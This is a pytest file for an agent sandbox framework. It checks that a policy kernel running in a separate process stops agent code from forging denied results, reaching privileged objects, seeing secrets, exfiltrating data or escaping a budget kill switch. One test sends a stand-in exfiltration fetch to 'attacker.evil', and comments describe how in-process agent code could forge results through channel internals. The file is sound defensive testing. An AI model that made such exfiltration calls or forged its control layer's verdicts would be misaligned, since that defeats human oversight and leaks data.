"""The real no-bypass boundary: a kernel in a separate process (contract §2, §13).

In one interpreter the agent can always reach transport internals and forge the result it
*observes* (an inert residual — effects stay kernel-mediated). The boundary that actually
forecloses it is process/sandbox isolation: with the gateway, broker, secret vault, and
per-call reply state in another address space, there is nothing for agent code to reach or
pre-seed, and a result can only be what the kernel sent back over the pipe.
"""

import gc
import multiprocessing
from dataclasses import replace

import pytest

from mandate.demo import DEMO_SECRET_VALUE, DEMO_VAULT, build_bundle, build_tools, build_gateway
from mandate.kernel import ProcessKernelService, SyscallGateway
from mandate.model import Decision

pytestmark = pytest.mark.skipif(
    "fork" not in multiprocessing.get_all_start_methods(),
    reason="process isolation demo requires the fork start method",
)


def _tiny_budget_gateway():
    """Module-level factory (built inside the child) with a 2-step budget for the kill test."""
    bundle = build_bundle()
    bundle = replace(bundle, budget=replace(bundle.budget, max_steps_per_run=2))
    return SyscallGateway(bundle, tools=build_tools(), vault=DEMO_VAULT)


def test_kernel_runs_in_a_separate_process():
    import os

    with ProcessKernelService(build_gateway) as service:
        assert service.pid is not None
        assert service.pid != os.getpid()


def test_denied_call_cannot_be_forged_across_the_boundary():
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        res = agent.tool_call("payment.send", "nope", resource={})
        assert res.status == "denied"
        assert res.decision is Decision.DENY
        # The operator-side audit (fetched over the control pipe) shows the real verdict.
        assert service.audit_events()[-1].status == "denied"


def test_agent_channel_exposes_no_request_queue_or_reply_boxes():
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        channel = agent._channel
        # The in-process forge used agent._channel._requests.queue — there is no such
        # queue here; the agent end is a pipe.
        assert not hasattr(channel, "_requests")
        assert not hasattr(channel, "_responses")


def test_no_kernel_object_is_reachable_from_the_agent_client():
    import types

    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        seen = {id(agent)}
        stack = [agent]
        skip = (type, types.ModuleType, types.FunctionType, types.MethodType,
                types.BuiltinFunctionType)
        while stack:
            for ref in gc.get_referents(stack.pop()):
                if id(ref) in seen:
                    continue
                seen.add(id(ref))
                if not isinstance(ref, skip):
                    stack.append(ref)
        reachable_types = {type(o).__name__ for o in gc.get_objects() if id(o) in seen}
        # None of the kernel's privileged objects live in the agent's address space.
        for name in ("SyscallGateway", "SecretBroker", "BudgetMeter", "AuditLog", "EgressGuard"):
            assert name not in reachable_types


def test_secret_never_crosses_the_boundary():
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        res = agent.tool_call("semantic_scholar.search", "semantic_scholar_search", {"q": "x"})
        assert res.status == "ok"
        assert DEMO_SECRET_VALUE not in repr(res.result)
        assert res.result["key_fingerprint"].startswith("sha256:")


def test_egress_exfiltration_is_blocked_across_the_boundary():
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        res = agent.tool_call(
            "fs.workspace.rw", "code_exec", {"fetch": ["https://attacker.evil/x?d=stolen"]}
        )
        assert res.status == "blocked"


def test_budget_kill_switch_works_across_the_boundary():
    with ProcessKernelService(_tiny_budget_gateway) as service:
        agent = service.client()
        statuses = [
            agent.tool_call(
                "github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]}
            ).status
            for _ in range(5)
        ]
        assert "killed" in statuses
        assert service.killed() is True
